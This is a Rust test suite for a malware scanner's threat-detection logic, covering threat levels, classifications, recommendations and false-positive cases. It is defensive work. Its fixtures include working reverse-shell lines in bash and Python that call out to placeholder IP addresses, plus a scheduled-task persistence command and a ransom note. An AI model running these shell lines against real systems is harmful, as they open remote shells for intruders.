#![allow(
    clippy::case_sensitive_file_extension_comparisons,
    clippy::cast_possible_truncation,
    clippy::cast_possible_wrap,
    clippy::cast_precision_loss,
    clippy::cast_sign_loss,
    clippy::collection_is_never_read,
    clippy::field_reassign_with_default,
    clippy::format_push_string,
    clippy::float_cmp,
    clippy::if_not_else,
    clippy::ignore_without_reason,
    clippy::items_after_statements,
    clippy::iter_on_single_items,
    clippy::large_futures,
    clippy::large_stack_arrays,
    clippy::large_stack_frames,
    clippy::manual_assert_eq,
    clippy::manual_let_else,
    clippy::match_same_arms,
    clippy::match_wildcard_for_single_variants,
    clippy::needless_collect,
    clippy::needless_pass_by_ref_mut,
    clippy::needless_pass_by_value,
    clippy::no_effect_underscore_binding,
    clippy::option_if_let_else,
    clippy::ref_option,
    clippy::redundant_clone,
    clippy::redundant_pattern_matching,
    clippy::self_only_used_in_recursion,
    clippy::significant_drop_tightening,
    clippy::single_match_else,
    clippy::single_option_map,
    clippy::too_many_lines,
    clippy::trivially_copy_pass_by_ref,
    clippy::unnecessary_debug_formatting,
    clippy::unreadable_literal,
    clippy::unused_async,
    clippy::unused_self,
    clippy::used_underscore_binding,
    clippy::useless_let_if_seq,
    clippy::wildcard_enum_match_arm,
    clippy::ignored_unit_patterns
)]

use file_scanner::threat_detection::*;
use std::collections::HashMap;
use std::fs::File;
use std::io::Write;
use std::time::Duration;
use tempfile::tempdir;

/// Helper function to create test file with specific content
fn create_test_file_with_content(content: &[u8]) -> std::path::PathBuf {
    let temp_dir = tempdir().unwrap();
    let file_path = temp_dir.path().join("test_file.bin");
    let mut file = File::create(&file_path).unwrap();
    file.write_all(content).unwrap();

    // Prevent tempdir from being dropped
    std::mem::forget(temp_dir);
    file_path
}

#[test]
fn test_threat_level_variants() {
    let levels = vec![
        ThreatLevel::Clean,
        ThreatLevel::Suspicious,
        ThreatLevel::Malicious,
        ThreatLevel::Critical,
    ];

    for level in levels {
        let analysis = ThreatAnalysis {
            matches: vec![],
            threat_level: level.clone(),
            classifications: vec![],
            indicators: vec![],
            scan_stats: ScanStatistics {
                scan_duration: Duration::from_millis(100),
                rules_evaluated: 10,
                patterns_matched: 0,
                file_size_scanned: 1024,
            },
            recommendations: vec![],
            enhanced_analysis: None,
            evidence: Vec::new(),
        };

        assert!(std::mem::discriminant(&analysis.threat_level) == std::mem::discriminant(&level));
    }
}

#[test]
fn test_threat_classification_variants() {
    let classifications = vec![
        ThreatClassification::Trojan,
        ThreatClassification::Virus,
        ThreatClassification::Worm,
        ThreatClassification::Rootkit,
        ThreatClassification::Adware,
        ThreatClassification::Spyware,
        ThreatClassification::Ransomware,
        ThreatClassification::Apt,
        ThreatClassification::Pua,
        ThreatClassification::Banker,
        ThreatClassification::Downloader,
        ThreatClassification::Backdoor,
        ThreatClassification::Exploit,
        ThreatClassification::Cryptominer,
        ThreatClassification::InfoStealer,
    ];

    for classification in classifications {
        // Test that each classification can be created and compared
        assert!(classification == classification.clone());
    }
}

#[test]
fn test_yara_match_creation() {
    let mut metadata = HashMap::new();
    metadata.insert("author".to_string(), "Test Author".to_string());
    metadata.insert("description".to_string(), "Test rule".to_string());

    let yara_match = YaraMatch {
        rule_identifier: "test_rule".to_string(),
        tags: vec!["suspicious".to_string(), "malware".to_string()],
        metadata: metadata.clone(),
    };

    assert_eq!(yara_match.rule_identifier, "test_rule");
    assert_eq!(yara_match.tags.len(), 2);
    assert_eq!(yara_match.metadata.len(), 2);
    assert_eq!(yara_match.metadata.get("author").unwrap(), "Test Author");
}

#[test]
fn test_threat_indicator_creation() {
    let indicator = ThreatIndicator {
        indicator_type: IndicatorType::KnownMalwareFamily,
        description: "Known trojan family detected".to_string(),
        severity: Severity::High,
        confidence: 0.9,
    };

    assert!(matches!(
        indicator.indicator_type,
        IndicatorType::KnownMalwareFamily
    ));
    assert!(matches!(indicator.severity, Severity::High));
    assert_eq!(indicator.confidence, 0.9);
}

#[test]
fn test_all_indicator_types() {
    let types = vec![
        IndicatorType::KnownMalwareFamily,
        IndicatorType::SuspiciousBehavior,
        IndicatorType::ExploitTechnique,
        IndicatorType::AntiAnalysis,
        IndicatorType::NetworkIndicator,
        IndicatorType::PersistenceMechanism,
        IndicatorType::DataExfiltration,
        IndicatorType::CryptoOperation,
    ];

    for indicator_type in types {
        let indicator = ThreatIndicator {
            indicator_type: indicator_type.clone(),
            description: "Test indicator".to_string(),
            severity: Severity::Medium,
            confidence: 0.8,
        };

        assert!(
            std::mem::discriminant(&indicator.indicator_type)
                == std::mem::discriminant(&indicator_type)
        );
    }
}

#[test]
fn test_all_severity_levels() {
    let severities = vec![
        Severity::Low,
        Severity::Medium,
        Severity::High,
        Severity::Critical,
    ];

    for severity in severities {
        let indicator = ThreatIndicator {
            indicator_type: IndicatorType::SuspiciousBehavior,
            description: "Test".to_string(),
            severity: severity.clone(),
            confidence: 0.5,
        };

        assert!(std::mem::discriminant(&indicator.severity) == std::mem::discriminant(&severity));
    }
}

#[test]
fn test_scan_statistics_creation() {
    let stats = ScanStatistics {
        scan_duration: Duration::from_millis(500),
        rules_evaluated: 25,
        patterns_matched: 3,
        file_size_scanned: 4096,
    };

    assert_eq!(stats.scan_duration, Duration::from_millis(500));
    assert_eq!(stats.rules_evaluated, 25);
    assert_eq!(stats.patterns_matched, 3);
    assert_eq!(stats.file_size_scanned, 4096);
}

#[test]
fn test_analyze_threats_with_api_calls() {
    // Create a test file with suspicious API calls
    let content = b"VirtualAlloc\0WriteProcessMemory\0CreateRemoteThread\0SetWindowsHookEx\0";
    let file_path = create_test_file_with_content(content);

    let result = analyze_threats(&file_path);
    assert!(result.is_ok());

    let analysis = result.unwrap();
    assert!(!analysis.matches.is_empty());

    // Should detect suspicious_api_calls rule
    let api_match = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "suspicious_api_calls");
    assert!(api_match.is_some());
}

#[test]
fn test_analyze_threats_with_crypto_operations() {
    // Create a test file with crypto indicators
    let content = b"AES encryption key\0RSA private key\0ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let file_path = create_test_file_with_content(content);

    let result = analyze_threats(&file_path);
    assert!(result.is_ok());

    let analysis = result.unwrap();

    // Should detect crypto_operations rule
    let crypto_match = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "crypto_operations");
    assert!(crypto_match.is_some());
}

#[test]
fn test_analyze_threats_with_network_communication() {
    // Create a test file with network indicators
    let content = b"http://malicious.com\0https://evil.org\0socket connection\0";
    let file_path = create_test_file_with_content(content);

    let result = analyze_threats(&file_path);
    assert!(result.is_ok());

    let analysis = result.unwrap();

    // Should detect network_communication rule
    let network_match = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "network_communication");
    assert!(network_match.is_some());
}

#[test]
fn test_analyze_threats_clean_file() {
    // Create a test file with no suspicious content
    let content = b"This is a clean file with no malicious content at all.";
    let file_path = create_test_file_with_content(content);

    let result = analyze_threats(&file_path);
    assert!(result.is_ok());

    let analysis = result.unwrap();
    assert!(analysis.matches.is_empty());
    assert!(matches!(analysis.threat_level, ThreatLevel::Clean));
    assert!(analysis.classifications.is_empty());
    assert!(analysis.indicators.is_empty());
}

#[test]
fn test_analyze_threats_nonexistent_file() {
    let temp_dir = tempdir().unwrap();
    let nonexistent_path = temp_dir.path().join("nonexistent.bin");

    let result = analyze_threats(&nonexistent_path);
    assert!(result.is_err());
}

#[test]
fn test_threat_level_calculation_clean() {
    let matches = vec![];
    let indicators = vec![];

    let level = calculate_threat_level(&matches, &indicators);
    assert!(matches!(level, ThreatLevel::Clean));
}

#[test]
fn test_threat_level_calculation_critical() {
    let matches = vec![YaraMatch {
        rule_identifier: "test_rule".to_string(),
        tags: vec![],
        metadata: HashMap::new(),
    }];

    let indicators = vec![ThreatIndicator {
        indicator_type: IndicatorType::KnownMalwareFamily,
        description: "Critical threat".to_string(),
        severity: Severity::Critical,
        confidence: 0.9,
    }];

    let level = calculate_threat_level(&matches, &indicators);
    assert!(matches!(level, ThreatLevel::Critical));
}

#[test]
fn test_threat_level_calculation_malicious() {
    let matches = vec![YaraMatch {
        rule_identifier: "test_rule".to_string(),
        tags: vec![],
        metadata: HashMap::new(),
    }];

    let indicators = vec![ThreatIndicator {
        indicator_type: IndicatorType::KnownMalwareFamily,
        description: "Known malware".to_string(),
        severity: Severity::High,
        confidence: 0.8,
    }];

    let level = calculate_threat_level(&matches, &indicators);
    assert!(matches!(level, ThreatLevel::Malicious));
}

#[test]
fn test_threat_level_calculation_suspicious() {
    let matches = vec![
        YaraMatch {
            rule_identifier: "rule1".to_string(),
            tags: vec![],
            metadata: HashMap::new(),
        },
        YaraMatch {
            rule_identifier: "rule2".to_string(),
            tags: vec![],
            metadata: HashMap::new(),
        },
        YaraMatch {
            rule_identifier: "rule3".to_string(),
            tags: vec![],
            metadata: HashMap::new(),
        },
    ];

    let indicators = vec![ThreatIndicator {
        indicator_type: IndicatorType::SuspiciousBehavior,
        description: "Suspicious behavior".to_string(),
        severity: Severity::Medium,
        confidence: 0.7,
    }];

    let level = calculate_threat_level(&matches, &indicators);
    assert!(matches!(level, ThreatLevel::Suspicious));
}

#[test]
fn test_tag_to_classification_mapping() {
    let test_cases = vec![
        ("trojan", Some(ThreatClassification::Trojan)),
        ("virus", Some(ThreatClassification::Virus)),
        ("worm", Some(ThreatClassification::Worm)),
        ("rootkit", Some(ThreatClassification::Rootkit)),
        ("adware", Some(ThreatClassification::Adware)),
        ("spyware", Some(ThreatClassification::Spyware)),
        ("ransomware", Some(ThreatClassification::Ransomware)),
        ("apt", Some(ThreatClassification::Apt)),
        ("pua", Some(ThreatClassification::Pua)),
        ("banker", Some(ThreatClassification::Banker)),
        ("downloader", Some(ThreatClassification::Downloader)),
        ("backdoor", Some(ThreatClassification::Backdoor)),
        ("exploit", Some(ThreatClassification::Exploit)),
        ("cryptominer", Some(ThreatClassification::Cryptominer)),
        ("infostealer", Some(ThreatClassification::InfoStealer)),
        ("unknown_tag", None),
    ];

    for (tag, expected) in test_cases {
        let result = tag_to_classification(tag);
        assert_eq!(result, expected);
    }
}

#[test]
fn test_recommendations_for_critical_threat() {
    let threat_level = ThreatLevel::Critical;
    let matches = vec![];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);
    assert!(!recommendations.is_empty());

    let has_critical_recommendation = recommendations
        .iter()
        .any(|r| r.contains("CRITICAL") || r.contains("isolate"));
    assert!(has_critical_recommendation);
}

#[test]
fn test_recommendations_for_malicious_threat() {
    let threat_level = ThreatLevel::Malicious;
    let matches = vec![];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);
    assert!(!recommendations.is_empty());

    let has_malicious_recommendation = recommendations
        .iter()
        .any(|r| r.contains("Malicious") || r.contains("Quarantine"));
    assert!(has_malicious_recommendation);
}

#[test]
fn test_recommendations_for_suspicious_threat() {
    let threat_level = ThreatLevel::Suspicious;
    let matches = vec![];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);
    assert!(!recommendations.is_empty());

    let has_suspicious_recommendation = recommendations
        .iter()
        .any(|r| r.contains("Suspicious") || r.contains("sandboxed"));
    assert!(has_suspicious_recommendation);
}

#[test]
fn test_recommendations_for_clean_file() {
    let threat_level = ThreatLevel::Clean;
    let matches = vec![];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);
    assert!(!recommendations.is_empty());

    let has_clean_recommendation = recommendations
        .iter()
        .any(|r| r.contains("No significant threats"));
    assert!(has_clean_recommendation);
}

#[test]
fn test_recommendations_for_ransomware() {
    let threat_level = ThreatLevel::Malicious;
    let matches = vec![];
    let classifications = vec![ThreatClassification::Ransomware];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_ransomware_recommendation = recommendations
        .iter()
        .any(|r| r.contains("Backup") || r.contains("encrypted"));
    assert!(has_ransomware_recommendation);
}

#[test]
fn test_recommendations_for_infostealer() {
    let threat_level = ThreatLevel::Malicious;
    let matches = vec![];
    let classifications = vec![ThreatClassification::InfoStealer];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_infostealer_recommendation = recommendations
        .iter()
        .any(|r| r.contains("password") || r.contains("credential"));
    assert!(has_infostealer_recommendation);
}

#[test]
fn test_recommendations_for_backdoor() {
    let threat_level = ThreatLevel::Malicious;
    let matches = vec![];
    let classifications = vec![ThreatClassification::Backdoor];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_backdoor_recommendation = recommendations
        .iter()
        .any(|r| r.contains("network") || r.contains("remote access"));
    assert!(has_backdoor_recommendation);
}

#[test]
fn test_recommendations_for_cryptominer() {
    let threat_level = ThreatLevel::Suspicious;
    let matches = vec![];
    let classifications = vec![ThreatClassification::Cryptominer];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_cryptominer_recommendation = recommendations
        .iter()
        .any(|r| r.contains("CPU") || r.contains("mining"));
    assert!(has_cryptominer_recommendation);
}

#[test]
fn test_recommendations_for_anti_analysis() {
    let threat_level = ThreatLevel::Suspicious;
    let matches = vec![YaraMatch {
        rule_identifier: "anti_analysis".to_string(),
        tags: vec!["anti_analysis".to_string()],
        metadata: HashMap::new(),
    }];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_anti_analysis_recommendation = recommendations
        .iter()
        .any(|r| r.contains("anti-analysis") || r.contains("sandbox"));
    assert!(has_anti_analysis_recommendation);
}

#[test]
fn test_recommendations_for_persistence() {
    let threat_level = ThreatLevel::Suspicious;
    let matches = vec![YaraMatch {
        rule_identifier: "persistence".to_string(),
        tags: vec!["persistence".to_string()],
        metadata: HashMap::new(),
    }];
    let classifications = vec![];

    let recommendations = generate_recommendations(&threat_level, &matches, &classifications);

    let has_persistence_recommendation = recommendations
        .iter()
        .any(|r| r.contains("startup") || r.contains("persistence"));
    assert!(has_persistence_recommendation);
}

#[test]
fn test_create_threat_indicator() {
    let mut metadata = HashMap::new();
    metadata.insert(
        "description".to_string(),
        "Test threat indicator".to_string(),
    );
    metadata.insert("severity".to_string(), "high".to_string());

    let rule_match = YaraMatch {
        rule_identifier: "test_rule".to_string(),
        tags: vec!["anti_vm".to_string()],
        metadata: metadata.clone(),
    };

    let indicator = create_threat_indicator(&rule_match).unwrap();
    assert_eq!(indicator.description, "Test threat indicator");
    assert!(matches!(indicator.severity, Severity::High));
    assert!(matches!(
        indicator.indicator_type,
        IndicatorType::AntiAnalysis
    ));
}

#[test]
fn test_create_threat_indicator_different_tags() {
    let test_cases = vec![
        (vec!["network".to_string()], IndicatorType::NetworkIndicator),
        (
            vec!["persistence".to_string()],
            IndicatorType::PersistenceMechanism,
        ),
        (vec!["exploit".to_string()], IndicatorType::ExploitTechnique),
        (vec!["crypto".to_string()], IndicatorType::CryptoOperation),
        (vec!["other".to_string()], IndicatorType::SuspiciousBehavior),
    ];

    for (tags, expected_type) in test_cases {
        let rule_match = YaraMatch {
            rule_identifier: "test_rule".to_string(),
            tags,
            metadata: HashMap::new(),
        };

        let indicator = create_threat_indicator(&rule_match).unwrap();
        assert!(
            std::mem::discriminant(&indicator.indicator_type)
                == std::mem::discriminant(&expected_type)
        );
    }
}

#[test]
fn test_create_threat_indicator_with_family() {
    let mut metadata = HashMap::new();
    metadata.insert("family".to_string(), "trojan.win32.test".to_string());

    let rule_match = YaraMatch {
        rule_identifier: "test_rule".to_string(),
        tags: vec![],
        metadata,
    };

    let indicator = create_threat_indicator(&rule_match).unwrap();
    assert!(matches!(
        indicator.indicator_type,
        IndicatorType::KnownMalwareFamily
    ));
}

#[test]
fn test_serialization_deserialization() {
    let analysis = ThreatAnalysis {
        matches: vec![YaraMatch {
            rule_identifier: "test_rule".to_string(),
            tags: vec!["test".to_string()],
            metadata: HashMap::new(),
        }],
        threat_level: ThreatLevel::Suspicious,
        classifications: vec![ThreatClassification::Trojan],
        indicators: vec![ThreatIndicator {
            indicator_type: IndicatorType::SuspiciousBehavior,
            description: "Test indicator".to_string(),
            severity: Severity::Medium,
            confidence: 0.8,
        }],
        scan_stats: ScanStatistics {
            scan_duration: Duration::from_millis(250),
            rules_evaluated: 10,
            patterns_matched: 1,
            file_size_scanned: 2048,
        },
        recommendations: vec!["Test recommendation".to_string()],
        enhanced_analysis: None,
        evidence: Vec::new(),
    };

    // Test JSON serialization
    let json = serde_json::to_string(&analysis).unwrap();
    let deserialized: ThreatAnalysis = serde_json::from_str(&json).unwrap();

    assert_eq!(analysis.matches.len(), deserialized.matches.len());
    assert_eq!(
        analysis.classifications.len(),
        deserialized.classifications.len()
    );
    assert_eq!(analysis.indicators.len(), deserialized.indicators.len());
    assert_eq!(
        analysis.recommendations.len(),
        deserialized.recommendations.len()
    );
}

/// Ordinary programs and documents are not malware: the enhanced analysis
/// (built-in rules plus the threatflux engine) keeps them Clean, with no
/// malware class and no Critical indicator, while the engine's own matches
/// stay visible under `enhanced_analysis`.
#[tokio::test]
async fn enhanced_analysis_keeps_ordinary_files_clean() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR"));
    // rust_test_binary is not here: it is one of the simulated-malware
    // programs (it beacons to msftupdater.com) and is a positive control below.
    let mut files: Vec<std::path::PathBuf> = vec![
        root.join("README.md"),
        // Documentation that quotes the simulated malware's domain, ptrace and
        // "Debugger detected!" is prose, not malware.
        root.join("test_programs/README.md"),
        root.join("Cargo.lock"),
        root.join("CHANGELOG.md"),
    ];
    for system in [
        "/bin/bash",
        "/usr/bin/ssh",
        "/bin/ls",
        "/usr/bin/curl",
        "/usr/bin/python3",
    ] {
        if std::path::Path::new(system).exists() {
            files.push(system.into());
        }
    }
    for file in files {
        let analysis = analyze_threats_enhanced(&file).await.unwrap();
        assert_eq!(analysis.threat_level, ThreatLevel::Clean, "{file:?}");
        assert!(analysis.classifications.is_empty(), "{file:?}");
        assert!(
            analysis
                .indicators
                .iter()
                .all(|i| !matches!(i.severity, Severity::Critical)),
            "{file:?}"
        );
        let info = analysis.enhanced_analysis.expect("enhanced info");
        assert!(!info.engine_merged, "{file:?}");
        assert!(info.engine_note.is_some());
    }
}

/// The repository's simulated-malware programs that carry detectable
/// behavior (mining words with a wallet, VM and debugger probing) are still
/// at least Suspicious.
#[tokio::test]
async fn enhanced_analysis_still_flags_the_simulated_malware() {
    let root = std::path::Path::new(env!("CARGO_MANIFEST_DIR")).join("test_programs");
    for name in [
        "crypto_miner_binary",
        "nim_test_binary",
        "c_advanced_binary",
        "d_test_binary",
        "fortran_test_binary",
        "rust_test_binary",
        "cpp_test_binary",
        "go_test_binary",
        "packed_rust_binary",
    ] {
        let analysis = analyze_threats_enhanced(&root.join(name)).await.unwrap();
        assert!(
            analysis.threat_level >= ThreatLevel::Suspicious,
            "{name}: {:?}",
            analysis.threat_level
        );
        assert!(!analysis.matches.is_empty(), "{name}");
        // The plain built-in analysis rates them too, with evidence.
        let plain = analyze_threats(&root.join(name)).unwrap();
        if matches!(
            name,
            "cpp_test_binary" | "go_test_binary" | "packed_rust_binary"
        ) {
            assert!(plain.threat_level >= ThreatLevel::Suspicious, "{name}");
            assert!(plain.evidence.iter().any(|e| e.strings_total > 0), "{name}");
        }
    }
}

/// Built-in rules that matched (here the backdoor words) must not pull the
/// engine's unrelated malware classes or its Critical KnownMalwareFamily
/// indicators into the result.
#[tokio::test]
async fn engine_classes_are_not_added_to_a_file_with_one_builtin_match() {
    let dir = tempdir().unwrap();
    let path = dir.path().join("tool.bin");
    let text = "sh -c ls\nsocket bind listen /bin/sh\n\
                d41d8cd98f00b204e9800998ecf8427e mining difficulty hashrate\n";
    std::fs::write(&path, text).unwrap();
    let analysis = analyze_threats_enhanced(&path).await.unwrap();
    let extra: Vec<_> = analysis
        .classifications
        .iter()
        .filter(|c| !matches!(c, ThreatClassification::Backdoor))
        .collect();
    assert!(extra.is_empty(), "{:?}", analysis.classifications);
    assert!(
        analysis.indicators.iter().all(|i| !matches!(
            (&i.indicator_type, &i.severity),
            (IndicatorType::KnownMalwareFamily, Severity::Critical)
        )),
        "{:?}",
        analysis.indicators
    );
}

/// A system editor that the built-in rules flag only for `sh -c` gets no
/// extra class or Critical indicator from the engine (skipped without vim).
#[tokio::test]
async fn enhanced_analysis_adds_no_classes_beyond_the_builtin_ones() {
    let vim = std::path::Path::new("/usr/bin/vim");
    if !vim.exists() {
        return;
    }
    let builtin = analyze_threats(vim).unwrap();
    let enhanced = analyze_threats_enhanced(vim).await.unwrap();
    for class in &enhanced.classifications {
        assert!(builtin.classifications.contains(class), "{class:?}");
    }
    assert!(enhanced
        .indicators
        .iter()
        .all(|i| !matches!(i.severity, Severity::Critical)));
    assert!(enhanced
        .indicators
        .iter()
        .all(|i| !i.description.contains("string_pattern_")
            && !i.description.contains("regex_pattern_")));
    let info = enhanced.enhanced_analysis.expect("enhanced info");
    assert!(info.engine_note.is_some_and(|n| n.len() < 160));
}

// ---- weak evidence does not classify or raise the level

fn level_of(content: &[u8]) -> (ThreatLevel, Vec<ThreatClassification>, Vec<String>) {
    let file = create_test_file_with_content(content);
    let analysis = analyze_threats(&file).unwrap();
    let rules = analysis
        .matches
        .iter()
        .map(|m| m.rule_identifier.clone())
        .collect();
    (analysis.threat_level, analysis.classifications, rules)
}

#[test]
fn a_short_string_such_as_slash_c_is_not_a_backdoor() {
    // The old rule matched "cmd.exe" next to the two bytes "/c".
    let (level, classes, _) = level_of(b"cmd.exe is a Windows shell; use dir /c to count");
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty(), "{classes:?}");
    // Both sides: the real command line still is one.
    let (level, classes, _) = level_of(b"cmd.exe /c whoami");
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Backdoor));
}

#[test]
fn a_nop_run_alone_is_reported_but_does_not_classify_or_raise_the_level() {
    let mut blob = vec![0xCC; 64];
    blob.extend_from_slice(&[0x90; 48]);
    blob.extend_from_slice(&[0xCC; 64]);
    let file = create_test_file_with_content(&blob);
    let analysis = analyze_threats(&file).unwrap();
    let hit = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "shellcode_patterns")
        .expect("the match is still reported");
    assert_eq!(
        hit.metadata.get("evidence_strength").map(String::as_str),
        Some("weak")
    );
    assert_eq!(analysis.threat_level, ThreatLevel::Clean);
    assert!(analysis.classifications.is_empty());
}

#[test]
fn markdown_that_describes_debugger_detection_is_not_suspicious() {
    let text = b"# Anti-debugging\n\nPrograms read TracerPid from /proc/self/status, call ptrace, \
check IsDebuggerPresent and OutputDebugString, or look for VMware and VirtualBox.\n";
    let (level, classes, rules) = level_of(text);
    assert!(rules.iter().any(|r| r == "anti_analysis"), "{rules:?}");
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
    // Both sides: the same words in a binary (a NUL byte first) still count.
    let mut binary = vec![0u8, 1, 2, 0];
    binary.extend_from_slice(text);
    let (level, _, _) = level_of(&binary);
    assert!(level >= ThreatLevel::Suspicious);
}

#[test]
fn the_word_bitcoin_next_to_a_file_extension_is_not_ransomware() {
    let (level, classes, _) =
        level_of(b"Bitcoin wallets use the .locked state and .encrypted data");
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
    let (level, classes, _) = level_of(b"Your files have been encrypted, pay in Bitcoin");
    assert_eq!(level, ThreatLevel::Critical);
    assert!(classes.contains(&ThreatClassification::Ransomware));
}

#[test]
fn two_strong_rules_still_rate_a_file() {
    let (level, _, _) = level_of(
        b"\0VirtualAlloc WriteProcessMemory CreateRemoteThread \0 schtasks /create \0 reverse shell",
    );
    assert!(level >= ThreatLevel::Suspicious);
}

#[test]
fn sh_dash_c_is_not_a_backdoor_but_a_reverse_shell_command_line_is() {
    // Every program that runs a command contains "sh -c".
    let (level, classes, _) = level_of(b"\0\x01/bin/sh -c\0system\0");
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
    let (level, classes, _) = level_of(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n");
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Backdoor));
}

#[test]
fn the_words_reverse_shell_in_documentation_are_reported_but_weak() {
    let file =
        create_test_file_with_content(b"# Notes\nA reverse shell connects back to the attacker.\n");
    let analysis = analyze_threats(&file).unwrap();
    let hit = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "backdoor_patterns")
        .expect("reported");
    assert_eq!(
        hit.metadata.get("evidence_strength").map(String::as_str),
        Some("weak")
    );
    assert_eq!(analysis.threat_level, ThreatLevel::Clean);
    assert!(analysis.classifications.is_empty());
}

/// Long leading prose does not make the binary part after it documentation.
#[test]
fn long_text_before_a_binary_part_is_not_a_text_file() {
    let prose = "The quick brown fox describes ordinary things in words.\n".repeat(1300);
    assert!(prose.len() > 70 * 1024);

    let mut a = prose.clone().into_bytes();
    a.extend_from_slice(b"\0ptrace\0 debugger detected \0");
    let analysis = analyze_threats(&create_test_file_with_content(&a)).unwrap();
    let evasion = analysis
        .matches
        .iter()
        .find(|m| m.rule_identifier == "self_announcing_evasion")
        .expect("self_announcing_evasion matches");
    assert!(!evasion.metadata.contains_key("evidence_strength"));
    assert_ne!(analysis.threat_level, ThreatLevel::Clean);

    let mut b = prose.into_bytes();
    b.extend_from_slice(b"\0IsDebuggerPresent OutputDebugString\0");
    let analysis = analyze_threats(&create_test_file_with_content(&b)).unwrap();
    assert_ne!(analysis.threat_level, ThreatLevel::Clean);
}

// ---- round 7: thin matches in large system files, padding beside a lone string,
// ---- and the Python reverse shell

fn weak_rules_of(content: &[u8]) -> (ThreatLevel, Vec<String>) {
    let analysis = analyze_threats(&create_test_file_with_content(content)).unwrap();
    let weak = analysis
        .matches
        .iter()
        .filter(|m| m.metadata.get("evidence_strength").map(String::as_str) == Some("weak"))
        .map(|m| m.rule_identifier.clone())
        .collect();
    (analysis.threat_level, weak)
}

#[test]
fn the_word_schtasks_alone_is_not_persistence_but_a_created_task_is() {
    let (level, classes, rules) = level_of(b"\0usage: schtasks list, schtasks query\0");
    assert!(
        !rules.iter().any(|r| r == "persistence_mechanisms"),
        "{rules:?}"
    );
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
    // Both sides: the creating command line, and the word beside a Run key.
    let (level, _, rules) = level_of(b"\0schtasks /create /tn x /tr y\0");
    assert!(rules.iter().any(|r| r == "persistence_mechanisms"));
    assert!(level >= ThreatLevel::Suspicious);
    let (level, _, _) =
        level_of(b"\0schtasks\0Software\\Microsoft\\Windows\\CurrentVersion\\Run\0");
    assert!(level >= ThreatLevel::Suspicious);
}

#[test]
fn hypervisor_names_alone_are_weak_but_a_dmi_read_or_debugger_check_is_not() {
    let (level, weak) = weak_rules_of(b"\0VMware\0QEMU\0");
    assert_eq!(weak, ["anti_analysis"]);
    assert_eq!(level, ThreatLevel::Clean);
    let (level, weak) = weak_rules_of(b"\0VMware\0QEMU\0/sys/class/dmi/id/product_name\0");
    assert!(weak.is_empty(), "{weak:?}");
    assert!(level >= ThreatLevel::Suspicious);
    let (level, weak) = weak_rules_of(b"\0IsDebuggerPresent\0OutputDebugString\0");
    assert!(weak.is_empty());
    assert!(level >= ThreatLevel::Suspicious);
}

#[test]
fn the_two_short_shellcode_patterns_count_in_a_small_file_only() {
    let pair = [
        &[0xE8u8, 0, 0, 0, 0, 0x5B][..],
        &[0x55, 0x66, 0x77, 0x88][..],
        &[0x64, 0xA1, 0, 0, 0, 0][..],
    ]
    .concat();
    let (level, weak) = weak_rules_of(&pair);
    assert!(weak.is_empty(), "{weak:?}");
    assert!(level >= ThreatLevel::Suspicious);
    // The same two patterns far apart in a large binary say nothing.
    let mut big = vec![0xCCu8; 600 * 1024];
    big[1000..1006].copy_from_slice(&pair[..6]);
    big[500_000..500_006].copy_from_slice(&pair[pair.len() - 6..]);
    let (level, weak) = weak_rules_of(&big);
    assert_eq!(weak, ["shellcode_patterns"]);
    assert_eq!(level, ThreatLevel::Clean);
}

#[test]
fn a_padding_run_beside_a_lone_get_pc_is_weak() {
    let mut blob = vec![0x90u8; 48];
    blob.extend_from_slice(&[0x55, 0x89, 0xE5, 0xE8, 0, 0, 0, 0, 0x5B, 0xC3]);
    let (level, weak) = weak_rules_of(&blob);
    assert_eq!(weak, ["shellcode_patterns"]);
    assert_eq!(level, ThreatLevel::Clean);
}

#[test]
fn a_python_reverse_shell_is_a_backdoor_and_ordinary_python_is_not() {
    let shell = b"import socket, subprocess, os\ns = socket.socket()\ns.connect((\"203.0.113.1\", 4444))\n\
os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2)\nsubprocess.call([\"/bin/sh\", \"-i\"])\n";
    let (level, classes, _) = level_of(shell);
    assert!(level >= ThreatLevel::Suspicious);
    assert!(classes.contains(&ThreatClassification::Backdoor));
    let pty = b"import pty, os, socket\ns = socket.socket()\ns.connect((\"203.0.113.1\", 4444))\nos.dup2(s.fileno(), 0)\npty.spawn(\"bash\")\n";
    assert!(level_of(pty).0 >= ThreatLevel::Suspicious);
    // Ordinary Python redirects descriptors or starts a shell, not both.
    let (level, classes, _) =
        level_of(b"import os\nos.dup2(log.fileno(), 1)\nos.dup2(log.fileno(), 2)\n");
    assert_eq!(level, ThreatLevel::Clean);
    assert!(classes.is_empty());
    let (level, _, _) =
        level_of(b"import subprocess\nsubprocess.call([\"/bin/sh\", \"-c\", \"ls\"])\n");
    assert_eq!(level, ThreatLevel::Clean);
    // A daemonizing helper has os.dup2( and /bin/sh but no socket connect.
    let (level, classes, _) = level_of(
